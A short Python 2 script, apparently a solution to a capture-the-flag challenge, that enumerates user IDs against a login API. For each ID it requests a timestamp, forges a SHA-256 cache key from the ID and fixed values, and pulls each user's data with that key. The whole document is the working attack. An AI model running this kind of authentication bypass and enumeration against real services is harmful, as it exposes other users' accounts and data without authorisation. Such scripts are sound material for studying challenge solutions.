import requests
import json
import hashlib
import sys

for i in xrange(1,100):
	headers= {
        	'X-Cache-Command': 'META',
        	'X-Cache-User': str(i)
      	}
	r=requests.post("http://chall1.pythonanywhere.com/api/login", headers=headers)
	print r.text
	loaded = json.loads(r.text)
	deck = str(i)+" 000 114328 000 "+loaded['time']
	cck = hashlib.sha256(deck).hexdigest()
	headers1 = {"X-Cache-Command": "PULL", "X-Cache-User": str(i), "X-Cache-Key": cck}
	r1 = requests.post("http://chall1.pythonanywhere.com/api/login", headers=headers1)
	print r1.text